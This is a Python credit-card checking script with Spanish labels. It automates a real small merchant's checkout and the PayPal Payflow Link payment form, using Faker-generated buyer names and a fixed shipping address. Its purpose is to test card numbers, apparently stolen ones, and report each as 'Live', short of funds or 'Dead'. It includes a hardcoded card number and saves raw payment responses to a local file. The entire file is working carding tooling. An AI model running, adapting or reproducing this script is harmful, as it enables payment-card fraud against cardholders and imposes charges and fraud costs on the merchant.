import requests, json, cloudscraper, random, time, re, base64
from datetime import datetime, timedelta
from faker import Faker

def parse(text: str, a: str, b: str) -> str: 
    return text.split(a)[1].split(b)[0]

def parseX(data, start, end):
    try:
        star = data.index(start) + len(start)
        last = data.index(end, star)
        return data[star:last]

    except ValueError:
        return None

def procesar_y_validar(card):
    def es_fecha_anterior(mes, ano):
        fecha_actual = datetime.now().strftime('%Y-%m')
        fecha_proporcionada = f"{'20'+ano}-{mes:02}"
        return fecha_proporcionada >= fecha_actual
    KEYS = "/#%&()=?¿!¡*[]{}-_.:,;|@+"
    for KEY in KEYS:
        card = card.replace(KEY, "|")
    card = card.replace(" ", "|")    
    match = re.search(r'\d{15,16}\|\d{2}\|\d{2,4}\|\d{3,4}', card)
    if not match:
        return None    
    values = card.split("|")
    if len(values) < 4:
        return None    
    cc_number = values[0]
    mes = values[1]
    ano = values[2]
    ano = ano[2:] if len(ano) > 2 else ano
    cvv = values[3][0:4]    
    if not es_fecha_anterior(mes, ano):
        return None    
    return cc_number, mes, ano, cvv

def nbd(card):
    try:
        resultado = procesar_y_validar(card)    
        if resultado is None:
            return f"card -» {card}\nStatus -» Fechas Invalidas \nResult -» Fechas Invalidas\n"
        else:
            cc_number, mes, ano, cvv = resultado  

        faker = Faker()  
        nombre= faker.first_name()
        apellido= faker.last_name()
        email = f'{nombre}{apellido}.{cc_number[6:12]}%40icloud.com'
        zip_code = faker.zipcode()
        street = faker.address()
        city = faker.city()
        state_abbr = faker.state_abbr()
        phone = ''.join([str(random.randint(0, 9)) for _ in range(10)])


        seccion = cloudscraper.create_scraper(browser={'browser': 'chrome', 'platform': 'ios', 'mobile': True}, delay=2)

        inicio=datetime.now()

        headers = {
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-language': 'es-419,es;q=0.9',
            'cache-control': 'max-age=0',
            'priority': 'u=0, i',
            'upgrade-insecure-requests': '1',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36',
        }

        r1 = seccion.get(
            'https://nigelbdesign.com/item/anti-vibration-for-ptz-cameras/cisco-style-camera-anti-vibration-platform-mounts/nb-cis',
            headers=headers,
        )

        headers = {
            'accept': 'application/json, text/javascript, */*; q=0.01',
            'accept-language': 'es-419,es;q=0.9',
            'content-type': 'application/json; charset=UTF-8',
            'origin': 'https://nigelbdesign.com',
            'priority': 'u=1, i',
            'referer': 'https://nigelbdesign.com/item/anti-vibration-for-ptz-cameras/cisco-style-camera-anti-vibration-platform-mounts/nb-cis',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36',
            'x-requested-with': 'XMLHttpRequest',
        }
        json_data = {
            'items': [
                {
                    'ItemID': 1062,
                    'Quantity': '0',
                    'CategoryID': 1021,
                    'Inventory': None,
                    'ItemNumber': 'NB-CIS',
                    'OrderType': 1,
                },
            ],
            'componentID': '1070',
            'type': '1',
            'addedFromPage': 'ItemDetail',
        }
        r2 = seccion.post('https://nigelbdesign.com/addtocart',   headers=headers, json=json_data)
        token = parse(r2.text,'https://cart.thomasnet-navigator.com/cbcheckout/ViewCart?Token=','","orderMinQty"')
        num = parse(r2.text,'recordids=','\\"')

        headers = {
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-language': 'es-419,es;q=0.9',
            'priority': 'u=0, i',
            'referer': 'https://nigelbdesign.com/item/anti-vibration-for-ptz-cameras/cisco-style-camera-anti-vibration-platform-mounts/nb-cis',
            'upgrade-insecure-requests': '1',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36',
        }
        params = {
            'token': token,
            'recordids': num,
        }
        r3 = seccion.get('https://nigelbdesign.com/addtocart', params=params,   headers=headers)

        headers = {
            'accept': 'application/json, text/javascript, */*; q=0.01',
            'accept-language': 'es-419,es;q=0.9',
            'content-type': 'application/json; charset=UTF-8',
            'origin': 'https://cart.thomasnet-navigator.com',
            'priority': 'u=1, i',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36',
            'x-requested-with': 'XMLHttpRequest',
        }
        params = {
            'token': token,
            'returnurl': 'https://nigelbdesign.com/item/anti-vibration-for-ptz-cameras/cisco-style-camera-anti-vibration-platform-mounts/nb-cis',
        }
        json_data = {
            'actionmode': 'proceedtocheckout',
            'items': [
                {
                    'ItemID': 1062,
                    'PreviousQuantity': 1,
                    'Quantity': '1',
                    'OrderID': 1334,
                    'RecordID': 1409,
                    'MinOrderQty': 1,
                    'ItemNumber': 'NB-CIS',
                    'OrderType': 'Order',
                },
            ],
            'shipping': {
                'TaxExempt': '',
            },
        }
        r4 = seccion.post(
            'https://cart.thomasnet-navigator.com/cbcheckout/viewcart',
            params=params,
            headers=headers,
            json=json_data,
        )

        headers = {
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-language': 'es-419,es;q=0.9',
            'priority': 'u=0, i',
            'upgrade-insecure-requests': '1',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36',
        }
        params = {
            'token': token,
            'returnurl': 'https://nigelbdesign.com/item/anti-vibration-for-ptz-cameras/cisco-style-camera-anti-vibration-platform-mounts/nb-cis',
        }
        r5 = seccion.get(
            'https://cart.thomasnet-navigator.com/cbcheckout/shippingbilling',
            params=params,
            headers=headers,
        )

        headers = {
            'accept': 'application/json, text/javascript, */*; q=0.01',
            'accept-language': 'en-US,en;q=0.9',
            'content-type': 'application/json; charset=UTF-8',
            'origin': 'https://cart.thomasnet-navigator.com',
            'priority': 'u=1, i',
            'referer': f'https://cart.thomasnet-navigator.com/cbcheckout/shippingbilling?token={token}&returnurl=https%3A%2F%2Fnigelbdesign.com%2Fitem%2Fanti-vibration-for-ptz-cameras%2Fcisco-style-camera-anti-vibration-platform-mounts%2Fnb-cis',
            'sec-ch-ua': '"Chromium";v="142", "Google Chrome";v="142", "Not_A Brand";v="99"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36',
            'x-requested-with': 'XMLHttpRequest',
        }
        params = {
            'token': token,
            'returnurl': 'https://nigelbdesign.com/item/anti-vibration-for-ptz-cameras/cisco-style-camera-anti-vibration-platform-mounts/nb-cis',
        }
        json_data = {
            'actionmode': 'step1estimate',
            'items': None,
            'shipping': {
                'Addresses': [
                    {
                        'AddressType': '2',
                        'FirstName': nombre,
                        'LastName': apellido,
                        'CompanyName': '',
                        'Address1': '2018 Meadowview Drive',
                        'Address2': '',
                        'Address3': '',
                        'City': 'Ridgeway',
                        'StateShortName': 'MO',
                        'Region': '',
                        'State/Province_-_Shipping': '',
                        'CountryShortName': 'US',
                        'Zip': '64481',
                        'Phone': phone,
                        'Fax': '',
                        'Email': '',
                        'AddressNumber': '',
                    },
                ],
                'FreightOptions': [],
                'IsCheckout': True,
            },
        }
        r6 = seccion.post(
            'https://cart.thomasnet-navigator.com/cbcheckout/viewcart',
            params=params,
            headers=headers,
            json=json_data,
        )

        headers = {
            'accept': 'application/json, text/javascript, */*; q=0.01',
            'accept-language': 'en-US,en;q=0.9',
            'content-type': 'application/json; charset=UTF-8',
            'origin': 'https://cart.thomasnet-navigator.com',
            'priority': 'u=1, i',
            'referer': f'https://cart.thomasnet-navigator.com/cbcheckout/shippingbilling?token={token}&returnurl=https%3A%2F%2Fnigelbdesign.com%2Fitem%2Fanti-vibration-for-ptz-cameras%2Fcisco-style-camera-anti-vibration-platform-mounts%2Fnb-cis',
            'sec-ch-ua': '"Chromium";v="142", "Google Chrome";v="142", "Not_A Brand";v="99"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36',
            'x-requested-with': 'XMLHttpRequest',
        }
        params = {
            'token': token,
            'returnurl': 'https://nigelbdesign.com/item/anti-vibration-for-ptz-cameras/cisco-style-camera-anti-vibration-platform-mounts/nb-cis',
        }
        json_data = {
            'actionmode': 'save',
            'shipping': {
                'Addresses': [
                    {
                        'AddressType': '2',
                        'FirstName': nombre,
                        'LastName': apellido,
                        'CompanyName': '',
                        'Address1': '2018%20Meadowview%20Drive',
                        'Address2': '',
                        'Address3': '',
                        'City': 'Ridgeway',
                        'StateShortName': 'MO',
                        'Region': '',
                        'State/Province_-_Shipping': '',
                        'CountryShortName': 'US',
                        'Zip': '64481',
                        'Phone': phone,
                        'Fax': '',
                        'Email': email,
                        'AddressNumber': '',
                    },
                ],
                'FreightShippings': [],
                'GeneralShippings': [],
                'IsInternational': False,
                'IsCheckout': True,
                'IsFreight': False,
                'ErrorMessage': '',
                'FreightOptions': [],
                'TaxExempt': None,
                'ShippingTotal': None,
                'HandlingTotal': None,
                'TaxTotal': 0,
                'Total': None,
                'GeneralShippingKey': '128-Actual-41.71-0-4-0-0',
                'IsOnlyFreightServices': False,
                'ShippingAccountNumber': '',
                'IsValidAddress': True,
            },
            'isSaveAddress': False,
        }
        r7 = seccion.post(
            'https://cart.thomasnet-navigator.com/cbcheckout/shippingbilling',
            params=params,
            headers=headers,
            json=json_data,
        )

        headers = {
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-language': 'es-419,es;q=0.9',
            'priority': 'u=0, i',
            'upgrade-insecure-requests': '1',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36',
        }
        params = {
            'token': token,
            'returnurl': 'https://nigelbdesign.com/item/anti-vibration-for-ptz-cameras/cisco-style-camera-anti-vibration-platform-mounts/nb-cis',
        }
        r8 = seccion.get(
            'https://cart.thomasnet-navigator.com/cbcheckout/paymentoptions',
            params=params,
            headers=headers,
        )
        securetokenid = parse(r8.text,'paypal.com/?SecureTokenID=','&amp')
        securetoken = parse(r8.text,'SecureToken=','"')

        headers = {
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'Accept-Language': 'es-419,es;q=0.9',
            'Connection': 'keep-alive',
            'Referer': 'https://cart.thomasnet-navigator.com/',
            'Upgrade-Insecure-Requests': '1',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36',
        }
        params = {
            'SecureTokenID': securetokenid,
            'SecureToken': securetoken,
        }
        r9 = seccion.get('https://payflowlink.paypal.com/', params=params,   headers=headers)
        csrf = parse(r9.text,'name="CSRF_TOKEN" type="hidden" value="','"')

        headers = {
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-language': 'en-US,en;q=0.9',
            'cache-control': 'max-age=0',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://payflowlink.paypal.com',
            'priority': 'u=0, i',
            'referer': f'https://payflowlink.paypal.com/?SecureTokenID={securetokenid}&SecureToken={securetoken}',
            'sec-ch-ua': '"Chromium";v="142", "Google Chrome";v="142", "Not_A Brand";v="99"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'iframe',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'same-origin',
            'sec-fetch-storage-access': 'active',
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36',
        }
        data = [
            ('subaction', ''),
            ('CARDNUM', '' +cc_number+ ''),
            ('EXPMONTH', '' +mes+ ''),
            ('EXPYEAR', '' +ano+ ''),
            ('startdate_month', ''),
            ('startdate_year', ''),
            ('issue_number', ''),
            ('METHOD', 'C'),
            ('PAYMETHOD', 'C'),
            ('FIRST_NAME', nombre),
            ('LAST_NAME', apellido),
            ('template', ''),
            ('ADDRESS', '2018+Meadowview+Drive++'),
            ('CITY', 'Ridgeway'),
            ('STATE', 'MO'),
            ('ZIP', '64481'),
            ('COUNTRY', 'US'),
            ('PHONE', ''),
            ('EMAIL', ''),
            ('SHIPPING_FIRST_NAME', nombre),
            ('SHIPPING_LAST_NAME', apellido),
            ('ADDRESSTOSHIP', '2018+Meadowview+Drive++'),
            ('CITYTOSHIP', 'Ridgeway'),
            ('STATETOSHIP', 'MO'),
            ('ZIPTOSHIP', '64481'),
            ('COUNTRYTOSHIP', 'US'),
            ('PHONETOSHIP', ''),
            ('EMAILTOSHIP', ''),
            ('TYPE', 'A'),
            ('SHIPAMOUNT', '0.00'),
            ('TAX', '0.00'),
            ('VERBOSITY', 'HIGH'),
            ('flag3dSecure', ''),
            ('CURRENCY', 'USD'),
            ('STATE', 'MO'),
            ('swipeData', '0'),
            ('SECURETOKEN', f'{securetoken}'),
            ('SECURETOKENID', f'{securetokenid}'),
            ('PARMLIST', ''),
            ('MODE', ''),
            ('CSRF_TOKEN', f'{csrf}'),
            ('referringTemplate', 'minlayout'),
        ]
        r10 = seccion.post('https://payflowlink.paypal.com/processTransaction.do', headers=headers, data=data)
        resptext = parse(r10.text,'name="RESPTEXT" value="','"')
        respmsg = parse(r10.text,'name="RESPMSG" value="','"')
        avsdata = parse(r10.text,'name="AVSDATA" value="','"')
        source = r10.text
        
        tiempo = f'Tiempo:{float((datetime.now() - inicio).total_seconds()):0.2f}'

        with open("NBD Datos.txt", 'a',encoding='utf-8') as archivo:
            archivo.write(cc_number[:6]+'---'+source+'\n')

        if 'Approved' in source:
            status, result = "✅ Live", "Live Charged 1usd"

        elif 'Insufficient funds available' in source:
            msg = parseX(source, 'name="RESPMSG" value="', '"/>')
            status, result = "💸 Fondos Insuficientes", f"{msg} | AVS: {avsdata}"

        elif 'RESPMSG' in source:
            msg = parseX(source, 'name="RESPMSG" value="', '"/>')
            status, result = "❌ Dead", f"{msg} | AVS: {avsdata}"

        else:
            status, result = "⚠️ Error", "Avisar Al Admin "

        message_to_send = f"Card: {card}\nStatus: {status}\nResult: {result}\n{tiempo} segundos!\n"
        return message_to_send

    except Exception as e:
        print(e)
        message_to_send = f"card -» {card}\nStatus -»⚠️ Error  \nResult -» Desconexion " 
        return message_to_send

cards ='''5401040078503174|09|30|967'''

card_lines = cards.split('\n')
for card in card_lines:
      message_to_send = nbd(card)
      print(message_to_send)